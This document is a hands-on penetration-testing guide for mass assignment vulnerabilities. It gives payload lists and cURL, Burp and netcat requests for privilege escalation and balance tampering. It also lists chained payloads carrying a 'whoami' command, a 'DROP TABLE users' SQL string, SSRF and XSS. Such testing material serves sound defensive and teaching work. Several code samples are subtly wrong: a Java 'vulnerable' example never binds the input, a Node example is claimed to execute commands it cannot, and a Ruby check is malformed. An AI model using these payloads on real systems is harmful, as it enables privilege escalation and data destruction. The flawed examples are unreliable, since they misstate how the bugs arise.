# Testing for Mass Assignment Vulnerabilities

## Overview

Testing for Mass Assignment vulnerabilities involves verifying that a web application properly restricts user-controlled input from being bound to object properties to prevent attackers from modifying unauthorized fields, such as roles, permissions, or sensitive data, in server-side data models. According to OWASP (WSTG-INPV-020), Mass Assignment vulnerabilities occur when an application blindly assigns user-supplied input to model attributes without proper validation, allowing attackers to escalate privileges, tamper with data, or bypass security controls. This guide provides a hands-on methodology to test for Mass Assignment vulnerabilities, focusing on identifying endpoints, unauthorized field manipulation, role escalation, sensitive data modification, hidden field exploitation, API parameter tampering, and chained attacks, with tools, commands, payloads, and remediation strategies.

**Impact**: Mass Assignment vulnerabilities can lead to:
- Privilege escalation (e.g., gaining admin access).
- Unauthorized modification of sensitive data (e.g., account balances).
- Bypassing of business logic or security controls.
- Exposure of confidential information.
- Non-compliance with security standards (e.g., PCI DSS, GSSOC-4).

This guide aligns with OWASP’s WSTG-INPV-020, offering black-box and gray-box testing steps, beginner-friendly tool setups, specific commands, and ethical considerations. 

**Ethical Note**: Obtain explicit permission before testing, as Mass Assignment exploits may modify user data, escalate privileges, or disrupt application integrity, potentially causing significant harm.

## Testing Tools

The following tools are recommended for testing Mass Assignment vulnerabilities, with setup instructions optimized for new pentesters:

- **Burp Suite Community Edition**: Intercepts and modifies HTTP requests to inject unauthorized parameters.
  - Download from [PortSwigger](https://portswigger.net/burp/communitydownload).
  - Configure browser proxy: `127.0.0.1:8080` (Firefox recommended).
  - Use Repeater to test payloads and Proxy > HTTP History to identify API endpoints.
  - **Note**: Use “Param Miner” extension to discover hidden parameters.

- **Postman**: GUI tool for testing mass assignment in APIs.
  - Download from [Postman](https://www.postman.com/downloads/).
  - Send JSON or form payloads with additional fields.
  - **Tip**: Use Collections for batch testing.

- **OWASP ZAP 3.2**: A free tool for automated and manual injection testing.
  - Download from [ZAP](https://www.zaproxy.org/download/).
  - Configure browser proxy: `127.0.0.1:8080`.
  - Enable HUD (Head-Up Display):
    1. Go to Tools > Options > HUD.
    2. Enable HUD for in-browser testing.
  - Use Active Scan with custom parameter tests; manually verify findings due to limited mass assignment support.

- **cURL and HTTPie**: Send HTTP requests with manipulated parameters.
  - **cURL**:
    - Install on Linux:
      ```bash
      sudo apt install curl
      ```
    - Install on Windows/Mac: Pre-installed or download from [curl.se](https://curl.se/).
  - **HTTPie** (beginner-friendly):
    - Install on Linux/Mac:
      ```bash
      sudo apt install httpie
      ```
    - Install on Windows: `pip install httpie`.
    - Example:
      ```bash
      # cURL
      curl -i -X POST -d '{"user":"test","role":"admin"}' http://example.com/api/update
      # HTTPie
      http POST http://example.com/api/update user=test role=admin
      ```

- **Browser Developer Tools (Chrome/Firefox)**: Inspects requests and responses for parameter tampering.
  - Access: Press `F12` or `Ctrl+Shift+I`.
  - Use Network tab to analyze payloads and Console tab for errors.
  - **Note**: Firefox’s 2025 parameter inspection enhancements improve debugging.

- **Netcat (nc)**: Tests raw HTTP requests with custom payloads.
  - Install on Linux:
    ```bash
    sudo apt install netcat
    ```
  - Install on Windows/Mac: Download from [nmap.org](https://nmap.org/ncat/).
  - Example:
    ```bash
    echo -e "POST /api/update HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\"user\":\"test\",\"role\":\"admin\"}\n" | nc example.com 80
    ```

## Testing Methodology

This methodology follows OWASP’s black-box and gray-box approaches for WSTG-INPV-020, testing Mass Assignment vulnerabilities across endpoints, unauthorized field manipulation, role escalation, sensitive data modification, hidden field exploitation, API parameter tampering, and chained attacks.

### Common Mass Assignment Payloads

Below is a list of common payloads to test for Mass Assignment vulnerabilities. Start with simple payloads targeting common fields and escalate based on application behavior. Use with caution in controlled environments to avoid unauthorized data changes.

- **Unauthorized Field Payloads**:
  - `{"user":"test","role": "admin"}`
  - `{"email":"test@example.com","is_admin":true}`
  - `{"name":"Test","permissions":"full"}`
  - `{"username":"test","access_level":1}`

- **Role Escalation Payloads**:
  - `{"role":"admin"}`
  - `{"user_type":"superuser"}`
  - `{"group":"administrators"}`
  - `{"privileges":"root"}`

- **Sensitive Data Modification Payloads**:
  - `{"balance":1000000}`
  - `{"account_status":"verified"}`
  - `{"credit_limit":99999}`
  - `{"subscription":"premium"}`

- **Hidden Field Exploitation Payloads**:
  - `{"_is_admin":true}`
  - `{"hidden_role":"owner"}`
  - `{"internal_id":1}`
  - `{"_debug_mode":true}`

- **API Parameter Tampering Payloads**:
  - `{"user":"test","admin":true,"id":1}`
  - `{"email":"test@example.com","is_active":true}`
  - `{"profile":"public","is_private":false}`
  - `{"data":{"name":"test","role":"admin"}}`

- **Chained Attack Payloads**:
  - `{"user":"test","role":"admin","cmd":"whoami"}` (Mass Assignment + Command Injection)
  - `{"email":"test@example.com","is_admin":true,"sql":"1; DROP TABLE users"}` (Mass Assignment + SQL Injection)
  - `{"name":"test","role":"admin","url":"http://localhost"}` (Mass Assignment + SSRF)
  - `{"user":"test","is_admin":true,"script":"<script>alert(1)</script>"}` (Mass Assignment + XSS)

**Note**: Payloads depend on the application’s data model (e.g., Rails, Django) and API structure (e.g., JSON, form-data). Test payloads in query parameters, POST bodies, JSON payloads, or headers where data is processed.

### 1. Identify Mass Assignment Endpoints

**Objective**: Locate inputs or endpoints that update server-side data models.

**Steps**:
1. Browse the website:
   - Visit the target (e.g., `http://example.com`).
   - Identify forms, APIs, or features that update user data (e.g., profile updates, account settings).
2. Capture requests with Burp Suite:
   - Enable Intercept (Proxy > Intercept > On).
   - Submit forms or interact with APIs to capture requests in HTTP History.
   - Note parameters (e.g., `user=test`, `email=test@example.com`).
3. Inspect responses:
   - Check for updated data or success messages.
   - Use Developer Tools (`Ctrl+Shift+I`) to analyze requests.
4. List endpoints:
   - Document URLs, forms, and API endpoints (e.g., `POST /api/update`).

**Example Endpoints**:
- URL: `http://example.com/profile?user=test`
- Form: `<input name="email">`
- API: `POST /api/update` with `{"user": "test"}`

**Remediation**:
- Whitelist fields:
  ```python
  allowed_fields = ['email', 'name']
  data = {k: v for k, v in request.form.items() if k in allowed_fields}
  ```
- Explicit binding:
  ```python
  user.email = request.form.get('email')
  ```

**Tip**: Save the endpoint list in a report.

### 2. Test for Unauthorized Field Manipulation

**Objective**: Verify if unauthorized fields can be added to requests.

**Steps**:
1. Identify update endpoints:
   - Look for forms or APIs like `POST /api/update`.
2. Inject unauthorized payloads:
   - Use Burp Repeater:
     ```http
     POST /api/update HTTP/1.1
     Host: example.com
     Content-Type: application/json

     {"user":"test","role":"admin"}
     ```
   - Use cURL:
     ```bash
     curl -i -X POST -H "Content-Type: application/json" -d '{"user":"test","role":"admin"}' http://example.com/api/update
     ```
3. Check responses:
   - Look for role changes or success messages.
   - Test: `{"email":"test@example.com","is_admin":true}`.
4. Test variations:
   - Try: `role=superuser`, `permissions=full`.

**Example Vulnerable Code (Python/Django)**:
```python
user = User.objects.get(id=request.POST['id'])
user.update(**request.POST)
```
Test: `POST id=1&role=admin`
Result: Sets `role` to `admin`.

**Example Secure Code (Python/Django)**:
```python
user = User.objects.get(id=request.POST['id'])
user.email = request.POST.get('email')
user.save()
```
Test: Ignores `role`.

**Remediation**:
- Explicit updates:
  ```python
  user.name = request.POST.get('name')
  ```
- Filter inputs:
  ```python
  if 'role' in request.POST: raise ValueError("Unauthorized field")
  ```

**Tip**: Save manipulation evidence in a report.

### 3. Test for Role Escalation

**Objective**: Check if mass assignment allows privilege escalation.

**Steps**:
1. Inject role escalation payloads:
   - Test: `{"role":"admin"}`
   - Use Postman:
     ```json
     POST /api/update
     Content-Type: application/json
     {"user":"test","role":"admin"}
     ```
2. Check responses:
   - Log in to verify admin access.
   - Test: `{"user_type":"superuser"}`.
3. Test variations:
   - Try: `{"group":"administrators"}`.
4. Use Burp Intruder:
   - Fuzz role-related fields.

**Example Vulnerable Code (Ruby/Rails)**:
```ruby
user = User.find(params[:id])
user.update(params[:user])
```
Test: `POST user[id]=1&user[role]=admin`
Result: Grants admin role.

**Example Secure Code (Ruby/Rails)**:
```ruby
user = User.find(params[:id])
user.update(params.require(:user).permit(:email, :name))
```
Test: Ignores `role`.

**Remediation**:
- Use strong parameters:
  ```ruby
  params.require(:user).permit(:email, :name)
  ```
- Validate roles:
  ```ruby
  if params[:user][:role] raise "Unauthorized"
  ```

**Tip**: Save escalation evidence in a report.

### 4. Test for Sensitive Data Modification

**Objective**: Verify if mass assignment allows tampering with sensitive fields.

**Steps**:
1. Inject sensitive data payloads:
   - Test: `{"balance":1000000}`
   - Use cURL:
     ```bash
     curl -i -X POST -H "Content-Type: application/json" -d '{"user":"test","balance":1000000}' http://example.com/api/update
     ```
2. Check responses:
   - Verify balance changes in account.
   - Test: `{"account_status":"verified"}`.
3. Test variations:
   - Try: `{"credit_limit":99999}`.
4. Use Postman:
   - Send: `{"user":"test","subscription":"premium"}`.

**Example Vulnerable Code (Node.js/Express)**:
```javascript
const user = await User.findById(req.body.id);
user.set(req.body);
await user.save();
```
Test: `POST {"id":"1","balance":1000000}`
Result: Updates `balance`.

**Example Secure Code (Node.js/Express)**:
```javascript
const user = await User.findById(req.body.id);
user.email = req.body.email;
await user.save();
```
Test: Ignores `balance`.

**Remediation**:
- Restrict fields:
  ```javascript
  const allowed = ['email', 'name'];
  Object.keys(req.body).forEach(key => { if (!allowed.includes(key)) delete req.body[key]; });
  ```
- Validate values:
  ```javascript
  if (req.body.balance) throw new Error("Unauthorized field");
  ```

**Tip**: Save modification evidence in a report.

### 5. Test for Hidden Field Exploitation

**Objective**: Check if hidden or internal fields can be manipulated.

**Steps**:
1. Inject hidden field payloads:
   - Test: `{"_is_admin":true}`
   - Use Burp:
     ```http
     POST /api/update HTTP/1.1
     Host: example.com
     Content-Type: application/json

     {"user":"test","_is_admin":true}
     ```
2. Check responses:
   - Verify admin access or changes.
   - Test: `{"hidden_role":"owner"}`.
3. Inspect forms:
   - Look for hidden inputs in HTML (`<input type="hidden">`).
4. Use Developer Tools:
   - Check Network tab for hidden fields.

**Example Vulnerable Code (PHP/Laravel)**:
```php
$user = User::find($request->input('id'));
$user->update($request->all());
```
Test: `POST id=1&_is_admin=true`
Result: Grants admin status.

**Example Secure Code (PHP/Laravel)**:
```php
$user = User::find($request->input('id'));
$user->update($request->only(['email', 'name']));
```
Test: Ignores `_is_admin`.

**Remediation**:
- Use explicit fields:
  ```php
  $user->update($request->only('email', 'name'));
  ```
- Remove hidden fields:
  ```php
  unset($request['_is_admin']);
  ```

**Tip**: Save hidden field evidence in a report.

### 6. Test for API Parameter Tampering

**Objective**: Verify if API endpoints allow unauthorized parameter tampering.

**Steps**:
1. Inject API tampering payloads:
   - Test: `{"user":"test","admin":true}`
   - Use Postman:
     ```json
     POST /api/update
     Content-Type: application/json
     {"user":"test","admin":true}
     ```
2. Check responses:
   - Look for unauthorized changes.
   - Test: `{"email":"test@example.com","is_active":true}`.
3. Test nested objects:
   - Try: `{"data":{"name":"test","role":"admin"}}`.
4. Use Burp Intruder:
   - Fuzz API parameters.

**Example Vulnerable Code (Java/Spring)**:
```java
@PostMapping("/update")
public void update(@RequestBody Map<String, Object> data) {
    User user = userRepository.findById((String)data.get("id"));
    userRepository.save(user);
}
```
Test: `POST {"id":"1","admin":true}`
Result: Sets `admin`.

**Example Secure Code (Java/Spring)**:
```java
@PostMapping("/update")
public void update(@RequestBody UserDTO data) {
    User user = userRepository.findById(data.getId());
    user.setEmail(data.getEmail());
    userRepository.save(user);
}
```
Test: Ignores `admin`.

**Remediation**:
- Use DTOs:
  ```java
  public class UserDTO { private String email; private String name; }
  ```
- Validate input:
  ```java
  if (data.containsKey("admin")) throw new IllegalArgumentException();
  ```

**Tip**: Save tampering evidence in a report.

### 7. Test for Chained Attacks

**Objective**: Check if mass assignment can be combined with other vulnerabilities.

**Steps**:
1. Inject chained payloads:
   - Test: `{"user":"test","role":"admin","cmd":"whoami"}`
   - Use Burp:
     ```http
     POST /api/update HTTP/1.1
     Host: example.com
     Content-Type: application/json

     {"user":"test","role":"admin","cmd":"whoami"}
     ```
2. Check responses:
   - Look for command execution or other effects.
   - Test: `{"email":"test@example.com","is_admin":true,"sql":"1; DROP TABLE users"}`.
3. Test other vulnerabilities:
   - Try: `{"user":"test","role":"admin","url":"http://localhost"}`.
4. Use Netcat:
   ```bash
   echo -e "POST /api/update HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\"user\":\"test\",\"role\":\"admin\",\"cmd\":\"whoami\"}\n" | nc example.com 80
   ```

**Example Vulnerable Code (Node.js/Express)**:
```javascript
app.post('/update', async (req, res) => {
  const user = await User.findById(req.body.id);
  user.set(req.body);
  await user.save();
  res.send('Updated');
});
```
Test: `POST {"id":"1","role":"admin","cmd":"whoami"}`
Result: Executes command.

**Example Secure Code (Node.js/Express)**:
```javascript
app.post('/update', async (req, res) => {
  const { email, name } = req.body;
  const user = await User.findById(req.body.id);
  user.email = email;
  user.name = name;
  await user.save();
  res.send('Updated');
});
```
Test: No execution.

**Remediation**:
- Combine defenses:
  ```javascript
  const { email, name } = req.body;
  if (Object.keys(req.body).length > 2) throw new Error("Invalid fields");
  ```
- Implement CSP:
  ```html
  <meta http-equiv="Content-Security-Policy" content="default-src 'self'">
  ```

**Tip**: Save chained attack evidence in a report.